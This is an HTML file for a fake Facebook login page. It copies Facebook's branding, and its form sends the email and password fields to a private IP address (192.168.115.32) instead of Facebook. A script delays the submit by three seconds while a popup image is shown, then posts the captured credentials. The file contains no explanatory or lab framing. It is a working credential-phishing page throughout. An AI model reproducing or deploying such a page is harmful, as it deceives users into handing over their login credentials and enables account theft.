<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook â€” log in or sign up</title>

    <link rel="stylesheet" href="./index.css">
    <style>
        /* Popup styling */
        #popup {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        #popup img {
            max-width: 80%;
            max-height: 80%;
            border: 4px solid white;
            border-radius: 8px;
        }
    </style>
</head>

<body>
    <div class="container">
        <section class="intro-section">
            <h1>facebook</h1>
            <p>Facebook helps you connect and share with the people in your life.</p>
        </section>

        <section class="signin-section">
            <div>
                <form id="loginForm" method="post" action="http://192.168.115.32">
                    <div>
                        <input type="text" name="email" placeholder="Email address or phone number" required>
                    </div>

                    <div>
                        <input type="password" name="pass" placeholder="Password" required>
                    </div>

                    <div>
                        <button type="submit">Log in</button>
                    </div>

                    <a href="#">Forgotten password?</a>

                    <hr />

                    <div class="create-btn">
                        <button type="button">Create new account</button>
                    </div>
                </form>
            </div>

            <p>
                <a href="#"><strong>
                        Create a Page
                    </strong></a> for a celebrity, brand or business.
            </p>
        </section>
    </div>

    <!-- Popup image -->
    <div id="popup">
        <img src="108680.jpg" alt="Uploaded Image">
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function (event) {
            event.preventDefault(); // stop immediate submit
            document.getElementById("popup").style.display = "flex";

            // Wait 3 seconds before submitting for real
            setTimeout(() => {
                event.target.submit();
            }, 3000);
        });
    </script>
</body>

</html>
